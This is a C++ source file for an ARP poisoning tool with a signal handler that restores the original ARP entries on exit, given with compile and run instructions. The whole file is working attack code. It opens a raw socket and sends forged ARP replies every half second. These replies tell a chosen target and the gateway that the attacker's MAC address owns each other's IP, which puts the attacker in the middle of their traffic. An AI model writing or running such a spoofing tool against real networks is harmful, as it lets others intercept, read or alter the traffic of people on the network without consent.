// Compile: g++ -o arp_restore arp_restore.cpp -lpthread
// Run: sudo ./arp_restore <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPRestoreOnExit {
private:
    int sock;
    std::string iface, attackerMAC;
    std::string targetIP, targetMAC, gatewayIP, gatewayMAC;
    std::atomic<bool> running{false};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPRestoreOnExit(const std::string& i, const std::string& amac,
                     const std::string& tIP, const std::string& tMAC,
                     const std::string& gIP, const std::string& gMAC)
        : iface(i), attackerMAC(amac), targetIP(tIP), targetMAC(tMAC),
          gatewayIP(gIP), gatewayMAC(gMAC) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop() {
        while (running.load()) {
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    // Restore legitimate ARP entries - clean up
    void restore() {
        std::cout << "\n[*] Restoring legitimate ARP entries...\n";
        for (int i = 0; i < 10; i++) {
            sendARP(gatewayIP, gatewayMAC, targetIP, targetMAC);
            sendARP(targetIP, targetMAC, gatewayIP, gatewayMAC);
            usleep(100000);
        }
        std::cout << "[*] Restore complete\n";
    }
    
    static ARPRestoreOnExit* instance;
    
    static void signalHandler(int) {
        if (instance) {
            instance->running = false;
            instance->restore();
            exit(0);
        }
    }
    
    void run() {
        instance = this;
        signal(SIGINT, signalHandler);
        signal(SIGTERM, signalHandler);
        
        std::cout << "[*] ARP poisoning with auto-restore\n";
        std::cout << "[*] Ctrl+C will restore legitimate ARP entries\n";
        
        running = true;
        std::thread t(&ARPRestoreOnExit::poisonLoop, this);
        while (true) sleep(1);
    }
    
    ~ARPRestoreOnExit() { close(sock); }
};

ARPRestoreOnExit* ARPRestoreOnExit::instance = nullptr;

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>\n";
        return 1;
    }
    ARPRestoreOnExit poison(argv[6], argv[5], argv[1], argv[2], argv[3], argv[4]);
    poison.run();
    return 0;
}
